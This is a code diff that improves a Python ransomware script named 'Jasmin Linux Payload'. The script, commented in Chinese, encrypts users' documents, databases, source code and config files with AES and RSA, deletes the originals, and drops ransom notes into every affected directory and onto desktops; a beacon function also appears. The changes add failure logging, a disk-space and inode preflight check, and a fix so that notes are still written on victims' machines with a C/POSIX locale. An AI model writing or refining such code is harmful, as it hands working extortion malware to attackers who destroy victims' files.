@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Jasmin Linux Payload — Auto-generated
 # 内存安全版：不联网安装依赖(避免编译被OOM杀)，大文件流式加密，带加密进度条
-import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json,time
+import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json,time,errno
 try:import urllib.request,urllib.parse
 except:pass
 
@@ -34,7 +34,46 @@ SKIP_DIRS=frozenset(['/boot','/dev','/proc','/sys','/run','/sbin','/bin','/lib',
 EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.conf'}
 NOTE_NAME='READ_ME_DECRYPT.txt'
 CHUNK=1024*1024  # 1MB 分块，内存占用恒定
-SELF=os.path.basename(__file__)
+SELF=os.path.basename(__file__) if '__file__' in globals() else '-'
+
+# ────────────────────────────────────────
+# 失败原因记录：加密失败绝不能静默
+# ────────────────────────────────────────
+FAILS={}   # 原因文案 -> [次数, 首个样例路径]
+
+_EMAP={
+    errno.ENOSPC:'磁盘空间不足 (ENOSPC) — 加密需为每个文件额外生成等大的 .jasmin，需要与被加密数据等量的空闲空间',
+    errno.EDQUOT:'磁盘配额超限 (EDQUOT) — 用户/组配额已满',
+    errno.EROFS:'只读文件系统 (EROFS) — 目标目录所在挂载点不可写',
+    errno.EACCES:'权限不足 (EACCES) — 当前用户无权在该目录创建文件',
+    errno.EPERM:'权限不足 (EPERM)',
+    errno.EMFILE:'进程打开文件数超限 (EMFILE) — ulimit -n 太小',
+    errno.ENFILE:'系统打开文件数超限 (ENFILE)',
+    errno.ENAMETOOLONG:'路径名过长 (ENAMETOOLONG)',
+    errno.ELOOP:'符号链接层数过多 (ELOOP)',
+    errno.EISDIR:'目标被识别为目录 (EISDIR)',
+    errno.EXDEV:'跨设备链接 (EXDEV)',
+    errno.ENOMEM:'内存不足 (ENOMEM) — 系统内存/swap 耗尽',
+}
+
+def _why(e):
+    n=getattr(e,'errno',None)
+    if n in _EMAP:return _EMAP[n]
+    return '%s: %s'%(type(e).__name__,e)
+
+def _note_fail(e,path):
+    k=_why(e)
+    if k not in FAILS:FAILS[k]=[0,path]
+    FAILS[k][0]+=1
+
+def _report_fails():
+    if not FAILS:return
+    total=sum(v[0] for v in FAILS.values())
+    sys.stderr.write('[jasmin] !!! 有 %d 个文件加密失败，原因统计:\n'%total)
+    for k,v in sorted(FAILS.items(),key=lambda x:-x[1][0]):
+        sys.stderr.write('[jasmin] !!!   %d 次 — %s\n'%(v[0],k))
+        sys.stderr.write('[jasmin] !!!       例如: %s\n'%v[1])
+    sys.stderr.write('[jasmin] !!! 自查: 可用空间(df -h)、inode(df -i)、目录可写性、ulimit -n\n')
 
 def skip(p):
     fp=os.path.abspath(p)
@@ -83,9 +122,10 @@ def _enc_lib(path,pub):
         with open(tmp,'r+b') as f:
             f.seek(0);f.write(h.digest())
         os.remove(path);return True
-    except Exception:
+    except Exception as e:
         try:os.remove(tmp)
         except:pass
+        _note_fail(e,path)
         return False
 
 def _enc_openssl(path,pub_pem_path):
@@ -97,10 +137,14 @@ def _enc_openssl(path,pub_pem_path):
     try:
         kf=os.path.join(td,'k');cf=os.path.join(td,'c');ef=os.path.join(td,'e')
         r=subprocess.run(['openssl','enc','-aes-256-cbc','-nosalt','-in',path,'-out',cf,'-K',k.hex(),'-iv',iv.hex()],capture_output=True)
-        if r.returncode!=0:return False
+        if r.returncode!=0:
+            _note_fail(RuntimeError('openssl enc 退出码 %d: %s'%(r.returncode,(r.stderr or b'')[:200].decode('utf-8','replace'))),path)
+            return False
         open(kf,'wb').write(k+iv)
         r=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',pub_pem_path,'-in',kf,'-out',ef,'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256','-pkeyopt','rsa_mgf1_md:sha256'],capture_output=True)
-        if r.returncode!=0:return False
+        if r.returncode!=0:
+            _note_fail(RuntimeError('openssl pkeyutl 退出码 %d: %s'%(r.returncode,(r.stderr or b'')[:200].decode('utf-8','replace'))),path)
+            return False
         ek_len=os.path.getsize(ef)
         with open(tmp,'wb') as f:
             f.write(h)
@@ -113,9 +157,10 @@ def _enc_openssl(path,pub_pem_path):
                 f.write(esrc.read())
             f.write(struct.pack('<I',ek_len))
         os.remove(path);return True
-    except Exception:
+    except Exception as e:
         try:os.remove(tmp)
         except:pass
+        _note_fail(e,path)
         return False
     finally:
         try:import shutil;shutil.rmtree(td)
@@ -126,7 +171,9 @@ def encrypt(path,pub_obj,pub_pem_path):
     try:
         if USE_LIB:return _enc_lib(path,pub_obj)
         else:return _enc_openssl(path,pub_pem_path)
-    except:return False
+    except Exception as e:
+        _note_fail(e,path)
+        return False
 
 RANSOM_TXT="""
 {{RANSOM_NOTE}}
@@ -140,21 +187,18 @@ def drop_notes(dirs,sid):
     txt=RANSOM_TXT.replace('{sid}',sid)
     # 必须显式 utf-8：受害者机器 locale 可能是 C/POSIX，
     # 默认编码写中文会抛 UnicodeEncodeError 并被 except 静默吞掉 -> 勒索信不生成
-    written=0
+    written=0;wfails={}
     for d in dirs:
         if not os.path.isdir(d):continue
-        try:
-            with open(os.path.join(d,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
-            written+=1
-        except Exception:pass
-        for desk in ['Desktop','桌面']:
-            dp=os.path.join(d,desk)
-            if os.path.isdir(dp):
-                try:
-                    with open(os.path.join(dp,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
-                    written+=1
-                except Exception:pass
+        for tgt in [os.path.join(d,NOTE_NAME)]+[os.path.join(d,desk,NOTE_NAME) for desk in ('Desktop','桌面') if os.path.isdir(os.path.join(d,desk))]:
+            try:
+                with open(tgt,'w',encoding='utf-8',errors='replace') as f:f.write(txt)
+                written+=1
+            except Exception as e:
+                wfails[_why(e)]=wfails.get(_why(e),0)+1
     sys.stderr.write('[jasmin] 勒索信已投放 %d 处\n'%written)
+    for k,v in wfails.items():
+        sys.stderr.write('[jasmin] !!! 勒索信有 %d 处投放失败 — %s\n'%(v,k))
 
 # ────────────────────────────────────────
 # 进度条
@@ -166,6 +210,30 @@ def _fmt_b(n):
         if n<1024:return ('%.0f%s'%(n,u)) if u=='B' else ('%.2f%s'%(n,u))
         n/=1024
     return '%.2fPB'%n
+
+def preflight(roots,need_bytes,need_files):
+    """加密前预检：空间/inode 不足时明确警告，而不是等 34033 个文件一个个静默失败"""
+    try:
+        base=None
+        for r in roots:
+            if os.path.isdir(r):base=os.path.abspath(r);break
+        if base is None:return
+        warn=[]
+        try:
+            u=__import__('shutil').disk_usage(base)
+            if u.free < need_bytes*1.05:
+                warn.append('可用空间 %s < 需要 %s（加密需为每个文件额外生成等大的 .jasmin）'%(_fmt_b(u.free),_fmt_b(need_bytes*1.05)))
+        except Exception:pass
+        try:
+            st=os.statvfs(base)
+            if st.f_favail and st.f_favail < need_files:
+                warn.append('可用 inode %d < 需要 %d（每个 .jasmin 都占用一个新 inode）'%(st.f_favail,need_files))
+        except Exception:pass
+        if warn:
+            for w in warn:
+                sys.stderr.write('[jasmin] !!! 空间预检警告: %s\n'%w)
+            sys.stderr.write('[jasmin] !!! 继续执行，但加密很可能大面积失败。建议先清理磁盘/换分区，或改用 ~/.ssh 之外的可写大盘。\n')
+    except Exception:pass
 
 def scan_targets(roots):
     """预扫描：只统计数量与字节数，不保存路径列表，内存 O(1)"""
@@ -205,8 +273,12 @@ def make_progress(total_files,total_bytes,sid):
             cur=path
             if len(cur)>34:cur='…'+cur[-33:]
             line='  [%s] %5.1f%%  %d/%d  %s/%s  %s'%(bar,pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes),cur)
-            if len(line)>cols-1:line=line[:cols-1]
-            sys.stderr.write('\r'+line)
+            # 按显示宽度截断：CJK 与 █/░ 都是双宽，用 len() 会算错导致换行错乱
+            def _w(s):
+                return sum(2 if (ord(ch)>0x1100 and (ord(ch)<=0x115f or 0x2e80<=ord(ch)<=0xa4cf or 0xac00<=ord(ch)<=0xd7a3 or 0xf900<=ord(ch)<=0xfaff or 0xfe30<=ord(ch)<=0xfe6f or 0xff00<=ord(ch)<=0xff60 or 0xffe0<=ord(ch)<=0xffe6 or ord(ch)>=0x20000)) else 1 for ch in s)
+            while _w(line)>cols-1 and len(line)>1:
+                line=line[:-1]
+            sys.stderr.write('\r'+line+'\x1b[K')   # 清到行尾，避免残留
         else:
             if st['done']%50==0 or st['done']==total_files:
                 sys.stderr.write('[jasmin] %5.1f%% (%d/%d) %s/%s\n'%(pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes)))
@@ -259,7 +331,10 @@ def beacon(sid,stats=None,prog=None):
 def main():
     pub_obj=None;pub_pem_path=None
     if USE_LIB:
-        pub_obj=serialization.load_pem_public_key(RSA_PUB,default_backend())
+        try:
+            pub_obj=serialization.load_pem_public_key(RSA_PUB,default_backend())
+        except Exception as e:
+            sys.stderr.write('[jasmin] !!! 公钥加载失败，无法加密: %s\n'%e);sys.exit(2)
     else:
         td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
         open(pub_pem_path,'wb').write(RSA_PUB)
@@ -270,6 +345,10 @@ def main():
     sys.stderr.write('[jasmin] 正在扫描目标文件...\n')
     n_total,b_total=scan_targets(roots)
     sys.stderr.write('[jasmin] 发现 %d 个目标文件，合计 %s\n'%(n_total,_fmt_b(b_total)))
+    if n_total==0:
+        sys.stderr.write('[jasmin] 提示: 未发现匹配的目标文件。可用扩展名白名单见脚本 EXTS，跳过目录见 SKIP_DIRS。\n')
+
+    preflight(roots,b_total,n_total)   # 空间/inode 预检
 
     stats={'count':0,'size':0,'types':set(),'detail':{},'total_count':n_total,'total_size':b_total}
     hit_dirs=set()   # 记录含有被加密文件的目录 —— 勒索信必须投放到每一个
@@ -297,6 +376,7 @@ def main():
                             stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
         finish()
         sys.stderr.write('[jasmin] 加密完成: %d/%d 个文件, %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
+        _report_fails()   # 失败必须可见，否则无从定位
 
     note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
     try:
